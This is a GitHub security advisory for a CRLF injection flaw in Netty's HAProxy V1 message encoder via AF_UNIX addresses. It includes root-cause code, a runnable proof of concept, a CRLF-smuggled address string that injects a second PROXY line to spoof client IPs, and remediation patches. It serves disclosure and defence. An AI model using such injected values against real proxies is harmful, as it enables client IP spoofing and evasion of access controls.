# [M] Netty: HAProxy V1 Protocol CRLF Injection via AF_UNIX Address

## Summary
Severity: Medium
Advisory: GHSA-wh89-7897-x99h
CVE: CVE-2026-59919
CWE: CWE-93
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-wh89-7897-x99h
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-haproxy` — affected >=4.2.0.Final <4.2.16.Final
- Maven: `io.netty:netty-codec-haproxy` — affected >=0 <4.1.136.Final

## Details
# Security Vulnerability Report: HAProxy V1 Protocol CRLF Injection via AF_UNIX Address in Netty

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | Netty |
| **Version** | 4.2.12.Final (and all prior versions with codec-haproxy) |
| **Component** | `io.netty.handler.codec.haproxy.HAProxyMessageEncoder` |
| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences |
| **Impact** | HAProxy PROXY Protocol Injection / Client IP Spoofing |
| **CVSS 3.1 Score** | **7.5 (High)** |
| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |

## 2. Affected Components

- `io.netty.handler.codec.haproxy.HAProxyMessageEncoder` — `encodeV1()` method (lines 63-77): writes `sourceAddress` and `destinationAddress` directly to output without CRLF validation
- `io.netty.handler.codec.haproxy.HAProxyMessage` — constructor `checkAddress()` validates IPv4/IPv6 format but **only checks length for AF_UNIX** (line 439)

## 3. Vulnerability Description

Netty's HAProxy protocol encoder writes AF_UNIX socket addresses directly into the HAProxy V1 text protocol format **without validating for CRLF characters**. The V1 protocol uses CRLF (`\r\n`) as the line terminator, so CRLF characters in an address split the single PROXY header line into multiple lines, effectively injecting a second PROXY protocol header.

### Root Cause — Encoder

```java
// HAProxyMessageEncoder.java:63-77
private static void encodeV1(HAProxyMessage msg, ByteBuf out) {
    out.writeBytes(TEXT_PREFIX);                                    // "PROXY "
    out.writeByte((byte) ' ');
    out.writeCharSequence(msg.proxiedProtocol().name(), US_ASCII); // "UNIX_STREAM"
    out.writeByte((byte) ' ');
    out.writeCharSequence(msg.sourceAddress(), US_ASCII);           // <-- NO CRLF CHECK
    out.writeByte((byte) ' ');
    out.writeCharSequence(msg.destinationAddress(), US_ASCII);      // <-- NO CRLF CHECK
    out.writeByte((byte) ' ');
    // ...
    out.writeByte((byte) '\r');
    out.writeByte((byte) '\n');
}
```

### Root Cause — Insufficient Address Validation

```java
// HAProxyMessage.java:428-442
private static void checkAddress(String address, AddressFamily addrFamily) {
    switch (addrFamily) {
        case AF_UNIX:
            ObjectUtil.checkNotNull(address, "address");
            if (address.getBytes(CharsetUtil.US_ASCII).length > 108) {
                throw new IllegalArgumentException("invalid AF_UNIX address: " + address);
            }
            return;  // ONLY checks length <= 108, NO CRLF validation!
        case AF_IPv4:
            if (!NetUtil.isValidIpV4Address(address)) { ... }  // Format check blocks CRLF
        case AF_IPv6:
            if (!NetUtil.isValidIpV6Address(address)) { ... }  // Format check blocks CRLF
    }
}
```

IPv4 and IPv6 addresses are validated against format rules that implicitly reject CRLF. But **AF_UNIX addresses only check `length <= 108`** — any characters including CRLF are accepted.

## 4. Exploitability Prerequisites

This vulnerability is exploitable when:

1. An application uses Netty's `HAProxyMessageEncoder` to construct HAProxy V1 protocol headers
2. AF_UNIX (`UNIX_STREAM` or `UNIX_DGRAM`) addresses contain user-controlled input
3. The encoded PROXY header is sent to a downstream server or load balancer

**Affected use cases**:
- PROXY protocol relays that construct AF_UNIX messages from upstream data
- Load balancer integrations where socket paths come from configuration or external sources
- Multi-tenant proxies that dynamically construct PROXY headers

## 5. Attack Scenario

### Client IP Spoofing via Second PROXY Line Injection

```java
String maliciousAddr = "/var/run/app.sock\r\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80";

HAProxyMessage msg = new HAProxyMessage(
    HAProxyProtocolVersion.V1,
    HAProxyCommand.PROXY,
    HAProxyProxiedProtocol.UNIX_STREAM,
    maliciousAddr,                    // CRLF-injected source address
    "/var/run/dest.sock",
    0, 0);
```

**Wire format sent to backend**:
```
PROXY UNIX_STREAM /var/run/app.sock
PROXY TCP4 10.0.0.1 10.0.0.2 1234 80 /var/run/dest.sock 0 0
```

The backend receives **two PROXY lines**. Depending on implementation:
- HAProxy: may use the first line and ignore the second
- Other implementations: may use the **second** line, treating the connection as TCP4 from `10.0.0.1`
- This enables **client IP spoofing** — the backend believes the client is `10.0.0.1` when it's not

## 6. Proof of Concept

### Full Runnable PoC Source Code (HAProxyUnixCRLFPoC.java)

```java
import io.netty.buffer.ByteBuf;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.haproxy.*;
import java.nio.charset.StandardCharsets;

public class HAProxyUnixCRLFPoC {
    public static void main(String[] args) {
        System.out.println("=== Netty HAProxy AF_UNIX CRLF Injection PoC ===\n");

        String maliciousAddr = "/var/run/app.sock\r\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80";
        String destAddr = "/var/run/dest.sock";

        HAProxyMessage msg = new HAProxyMessage(
            HAProxyProtocolVersion.V1,
            HAProxyCommand.PROXY,
            HAProxyProxiedProtocol.UNIX_STREAM,
            maliciousAddr, destAddr, 0, 0);

        EmbeddedChannel ch = new EmbeddedChannel(HAProxyMessageEncoder.INSTANCE);
        ch.writeOutbound(msg);

        ByteBuf out = ch.readOutbound();
        String encoded = out.toString(StandardCharsets.UTF_8);
        out.release();
        ch.finishAndReleaseAll();

        System.out.println("Wire format:");
        for (String line : encoded.split("\n", -1)) {
            System.out.println("  " + line.replace("\r", "\\r"));
        }

        int proxyCount = 0;
        for (String line : encoded.split("\r\n")) {
            if (line.startsWith("PROXY")) proxyCount++;
        }
        System.out.println("PROXY lines: " + proxyCount);
        System.out.println("VULNERABLE: " + (proxyCount > 1 ? "YES" : "NO"));
    }
}
```

### How to Compile and Run

```bash
JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path "*/4.2.12.Final/*" \
  | grep -v sources | grep -v javadoc | tr '\n' ':')
javac -cp "$JARS" HAProxyUnixCRLFPoC.java
java -cp "$JARS:." HAProxyUnixCRLFPoC
```

### PoC Execution Output (Verified on Netty 4.2.12.Final)

```
=== Netty HAProxy AF_UNIX CRLF Injection PoC ===

[TEST 1] AF_UNIX Source Address CRLF Injection
------------------------------------------------
  Source address: "/var/run/app.sock\r\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80"
  Wire format:
    PROXY UNIX_STREAM /var/run/app.sock\r
    PROXY TCP4 10.0.0.1 10.0.0.2 1234 80 /var/run/dest.sock 0 0\r

  PROXY lines found: 2
  VULNERABLE: YES - Second PROXY line injected!
```

## 7. Remediation Recommendations

### Option 1: Validate AF_UNIX Addresses for CRLF

```java
// HAProxyMessage.java checkAddress() - add for AF_UNIX:
case AF_UNIX:
    ObjectUtil.checkNotNull(address, "address");
    byte[] addrBytes = address.getBytes(CharsetUtil.US_ASCII);
    if (addrBytes.length > 108) {
        throw new IllegalArgumentException("invalid AF_UNIX address: too long");
    }
    for (byte b : addrBytes) {
        if (b == '\r' || b == '\n') {
            throw new IllegalArgumentException(
                "AF_UNIX address contains prohibited CRLF character");
        }
    }
    return;
```

### Option 2: Validate in Encoder

```java
// HAProxyMessageEncoder.java encodeV1() - validate before writing:
private static void validateV1Address(String address) {
    for (int i = 0; i < address.length(); i++) {
        char c = address.charAt(i);
        if (c == '\r' || c == '\n' || c == ' ') {
            throw new HAProxyProtocolException(
                "V1 address contains prohibited character at index " + i);
        }
    }
}
```

## 8. References

- [HAProxy PROXY Protocol v1 Specification](https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)

## References
- https://github.com/netty/netty/security/advisories/GHSA-wh89-7897-x99h
- https://github.com/netty/netty
- https://github.com/netty/netty/releases/tag/netty-4.1.136.Final
- https://github.com/netty/netty/releases/tag/netty-4.2.16.Final
